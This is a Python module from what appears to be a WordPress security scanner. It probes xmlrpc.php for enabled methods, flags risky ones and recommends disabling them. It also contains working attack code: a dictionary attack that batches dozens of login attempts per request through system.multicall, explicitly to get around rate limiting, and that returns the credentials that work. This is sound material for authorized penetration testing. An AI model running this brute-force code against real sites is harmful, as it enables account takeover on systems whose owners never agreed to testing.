"""XML-RPC (xmlrpc.php) probing and abuse.

xmlrpc.php is WordPress's legacy API. Disabled-but-listening endpoints are a
finding on their own; worse, when `system.multicall` is enabled an attacker
can try HUNDREDS of credentials inside a single HTTP request, bypassing most
login-rate limiting (which only watches wp-login.php).

- probe(): one GET + one POST (system.listMethods) - quiet reconnaissance
- bruteforce(): credential attack batched through system.multicall, enabled
  with --via-xmlrpc
"""

import re

from .. import httpclient

METHODS_BODY = (
    '<?xml version="1.0"?><methodCall>'
    "<methodName>system.listMethods</methodName><params></params></methodCall>"
)

STRING_RE = re.compile(r"<string>([A-Za-z0-9_.]+)</string>")
FAULT_RE = re.compile(r"<name>faultCode</name>")

# outer envelope of a system.multicall response: <param><value><array><data>ITEMS...
OUTER_DATA_RE = re.compile(
    r"<param>\s*<value>\s*<array>\s*<data>(.*)</data>\s*</array>\s*</value>\s*</param>", re.S)
VALUE_TOKEN_RE = re.compile(r"<(/?)value>")


def probe(report, target):
    """Detect xmlrpc.php and report enabled methods. Returns True if alive."""
    report.section("XML-RPC (xmlrpc.php)")

    resp = httpclient.get(f"{target}xmlrpc.php")
    if resp is None or resp.status_code == 404:
        report.paragraph("xmlrpc.php is not reachable (404) - disabled or behind a WAF.")
        return False
    # A GET on xmlrpc.php returns 405 "XML-RPC server accepts POST requests only"
    # when it is alive; a 200 with "XML-RPC server accepts POST requests only" also occurs.
    alive = resp.status_code in (200, 405) or "XML-RPC" in resp.text
    if not alive:
        report.paragraph(f"xmlrpc.php answered with status {resp.status_code}; treat as disabled.")
        return False

    resp = httpclient.post(f"{target}xmlrpc.php", data=METHODS_BODY,
                           headers={"Content-Type": "text/xml"})
    methods = []
    if resp is not None and resp.status_code == 200:
        methods = STRING_RE.findall(resp.text)

    if not methods:
        print("[*] xmlrpc.php is alive but system.listMethods did not return a method list")
        report.paragraph("xmlrpc.php is alive (answers GET with 405) but method listing was "
                         "refused - authentication may be required or it's WAF-filtered.")
        return True

    print(f"[*] xmlrpc.php alive, {len(methods)} methods enabled")
    report.paragraph(f"xmlrpc.php is **enabled** with {len(methods)} methods.")

    dangers = {
        "pingback.ping": "pingback functionality = SSRF and DDoS-amplification vector",
        "system.multicall": "allows batching hundreds of credential attempts per HTTP request "
                            "(bypasses wp-login.php rate limiting)",
        "wp.getUsersBlogs": "leaks blog titles and user info on valid login",
    }
    flagged = [(m, why) for m, why in dangers.items() if m in methods]
    if flagged:
        for method, why in flagged:
            print(f"[!] xmlrpc method enabled: {method} - {why}")
        report.paragraph("High-risk methods enabled:")
        report.bullets([f"**{m}** - {why}" for m, why in flagged])
        report.paragraph("**Recommendation:** disable XML-RPC if unused, or filter system.multicall "
                         "and pingback.ping at the WAF/webserver.")
    else:
        report.paragraph("No high-risk methods in the list.")
    return True


def _multicall_body(calls):
    inner = "".join(
        "<value><struct>"
        f"<member><name>methodName</name><value><string>{name}</string></value></member>"
        "<member><name>params</name><value><array><data>"
        + "".join(f"<value>{p}</value>" for p in params)
        + "</data></array></value></member>"
        "</struct></value>"
        for name, params in calls
    )
    return ('<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
            "<params><param><value><array><data>" + inner + "</data></array></value></param>"
            "</params></methodCall>")


def _escape(value):
    return (value.replace("&", "&amp;").replace("<", "&lt;")
            .replace(">", "&gt;").replace('"', "&quot;"))


def _multicall_items(xml):
    """Per-call result items of a system.multicall response, in call order.

    Real WordPress is asymmetric: each SUCCESS comes back wrapped in its own
    `<value><array><data>...</data></array></value>`, but each FAILURE is a
    bare `<value><struct>faultCode ...</struct></value>` - there is no uniform
    wrapper to regex for (matching it anyway once made every mixed batch
    miscount, silently discarding found credentials). Items are therefore
    extracted by walking `<value>` nesting depth inside the outer array.
    Returns None when the response is not a recognizable multicall reply.
    """
    outer = OUTER_DATA_RE.search(xml)
    if not outer:
        return None
    inner = outer.group(1)
    items, depth, start = [], 0, None
    for token in VALUE_TOKEN_RE.finditer(inner):
        if token.group(1) != "/":          # opening <value>
            if depth == 0:
                start = token.start()
            depth += 1
        else:                              # closing </value>
            depth -= 1
            if depth == 0 and start is not None:
                items.append(inner[start:token.end()])
                start = None
    return items if depth == 0 else None


def multicall_credentials(target, pairs, chunk_size=50):
    """Test (user, password) pairs via system.multicall.

    Up to chunk_size credential checks per HTTP request. Returns {user: password}
    for the pairs that authenticated, {} when every pair failed cleanly, or
    None when a request failed / the reply could not be parsed (callers stop
    instead of hammering a blocked endpoint; anything found first is kept).
    """
    found = {}
    pairs = list(pairs)
    for start in range(0, len(pairs), chunk_size):
        chunk = pairs[start:start + chunk_size]
        calls = [("wp.getUsersBlogs",
                  [f"<string>{_escape(u)}</string>", f"<string>{_escape(p)}</string>"])
                 for u, p in chunk]
        resp = httpclient.post(f"{target}xmlrpc.php", data=_multicall_body(calls),
                               headers={"Content-Type": "text/xml"})
        if resp is None or resp.status_code != 200:
            print("[!] XML-RPC multicall request failed; aborting this attack.")
            return found or None
        items = _multicall_items(resp.text)
        if items is None or len(items) != len(chunk):
            # Unexpected shape (error page, single response) - can't align results.
            print("[!] Unexpected XML-RPC response shape; aborting this attack.")
            return found or None
        for (user, password), item in zip(chunk, items):
            if not FAULT_RE.search(item):
                found[user] = password
    return found


def bruteforce(report, target, user, passwords):
    """Dictionary attack for one user via system.multicall. Returns the password or None."""
    for password in (multicall_credentials(target, [(user, p) for p in passwords]) or {}).values():
        return password
    return None
